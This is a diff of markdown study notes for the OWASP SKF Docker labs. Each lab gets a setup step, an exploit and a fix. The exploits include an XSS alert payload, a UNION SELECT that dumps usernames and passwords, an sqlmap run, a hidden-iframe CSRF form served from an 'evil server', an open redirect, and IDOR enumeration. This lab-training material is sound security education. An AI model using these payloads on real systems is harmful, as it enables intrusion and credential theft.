@@ -1,10 +1,10 @@
-#How to connect to docker
+# How to connect to docker
 always run your container with --name myContainer
 So you can easily connect by:
 docker exec -it myContainer /bin/sh
 instead of getting the run-time specific container ID first
 
-#For simplicity, change /etc/hosts
+# For simplicity, change /etc/hosts
 Map your local IP to some name in /etc/hosts
 <ip> asdf
 
@@ -12,15 +12,15 @@ or just use localhost:
 docker run -ti -p 127.0.0.1:5000:5000 -p 127.0.0.1:1337:1337 blabla1337/owasp-skf-lab:xxxx
 
 
-#CORS
-##Preparation
+# CORS
+## Preparation
 docker pull blabla1337/owasp-skf-lab:cors
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cors
 
 Note: Run with multiple ports exposed:
 docker run -ti -p <ip>:5000:5000 -p <ip>:1337:1337 blabla1337/owasp-skf-lab:cors
 
-##Exploit
+## Exploit
 edit request, add:
 Origin:blabla.nl
 -> it gets reflected in the Access-Control-Allow-Origin header
@@ -40,30 +40,30 @@ function reqListener(){
 document.getElementById("cors").innerHTML= req.responseText;
 }
 </script>```
-##Fix
+## Fix
 replace:
     cors = CORS(app, resources={r"/*": {"origins": "*"}})^M
 with:
     cors = CORS(app, resources={r"/*": {"origins": "asdf"}})^M
 
 
-#XSS
-##Preparation
+# XSS
+## Preparation
 docker pull blabla1337/owasp-skf-lab:cross-site-scripting
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cross-site-scripting
-##Exploit
+## Exploit
 <script>alert('1')</script>asdf
 This will work in Firefox but not in Chrome since Chrome has XSS Auditor implemented.
-##Fix
+## Fix
 cd templates
 change index.html autoescape from false to true
 
 
-#sql-injection
+# sql-injection
 ##Preparation
 docker pull blabla1337/owasp-skf-lab:sql-injection
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection
-##Exploit
+## Exploit
 <ip>:5000/home/1'
 -> causes error
 
@@ -74,7 +74,7 @@ docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection
 
 Note: Users was a hint in the how-to. So we did not need to find this ourselves
 <ip>:5000/home/1 union select 1,username,password from users
-##Fix
+## Fix
 cd models
 vi sqlimodel.py
             #cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId='+pageId)
@@ -83,27 +83,27 @@ vi sqlimodel.py
 !! Careful, this is python, so spaces matter !!
 
 
-#sql-injection-like
-##Preparation
+# sql-injection-like
+## Preparation
 docker pull blabla1337/owasp-skf-lab:sql-injection-like
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection-like
-##Exploit
+## Exploit
 use comment
 or automated:
 python3 sqlmap.py --all --url http://<ip>:50000/home/admin
-##Fix
+## Fix
 cd models
 ```
 #cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId='+pageId)
 cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId=?',pageId)
 ```
 
-#Cross-site-request-forgery
-##Preparation
+# Cross-site-request-forgery
+## Preparation
 docker pull blabla1337/owasp-skf-lab:cross-site-request-forgery
 docker run -ti -p <ip>:5000:5000 -p <ip>:1337:1337 blabla1337/owasp-skf-lab:cross-site-request-forgery
 as with CORS, also start the evil server here
-##Exploit
+## Exploit
 make sure your evil server evil.html file includes the following script:
 ```<iframe style="display:none" name="csrf-frame"></iframe>
 <form method='POST' action='http://<ip>:5000/update' target="csrf-frame" id="csrf-form">
@@ -112,7 +112,7 @@ make sure your evil server evil.html file includes the following script:
 </form>                                              
 <script>document.getElementById("csrf-form").submit()</script>```
 This overwrites the color value. When you refresh the normal application you can see the damage.
-##Fix
+## Fix
 add hidden input field:
 ```<input type="hidden" name="CSRFToken"
 value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">```
@@ -128,16 +128,16 @@ csrf = CSRFProtect(app)
 ```
 
 
-#Open redirect
-##Preparation
+# Open redirect
+## Preparation
 docker pull blabla1337/owasp-skf-lab:url-redirect
 docker pull blabla1337/owasp-skf-lab:url-redirect-hard
 docker pull blabla1337/owasp-skf-lab:url-redirect-harder
 docker pull blabla1337/owasp-skf-lab:url-redirect-harder2
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:url-redirect-hard
-##Exploit
+## Exploit
 <ip>:5000/redirect?newurl=www.malicioussite.nl
-##Fix
+## Fix
 ```def redirector():
     whitelist = ["home", "dashboard"]
     landing_page = request.args.get('newurl')
@@ -146,11 +146,11 @@ docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:url-redirect-hard
 whitelist specific redirects that are allowed
 
 
-#IDOR
-##Preparation
+# IDOR
+## Preparation
 docker pull blabla1337/owasp-skf-lab:idor
 docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:idor
-##Exploit
+## Exploit
 enumerate create a pdf and check result with id
 try out random ids
 then intercept this POST /download and send it to intruder
@@ -162,6 +162,6 @@ for i in {1..1000} ; do echo $i >> a.txt ; done ;
 run under "Positions"/"Start attack" and check for varying response content length.
 We can see that the response length for payload 20 is different
 so go back to the website and download the pdf for id=20
-##Fix
+## Fix
 A real fix would be checking for authorization but there is not even authentication in place, so this would be quite some work.
 The "quick-fix" in the challenge is commenting out the generation of the pdf and removing it from the server. Then it's not accessible anymore.
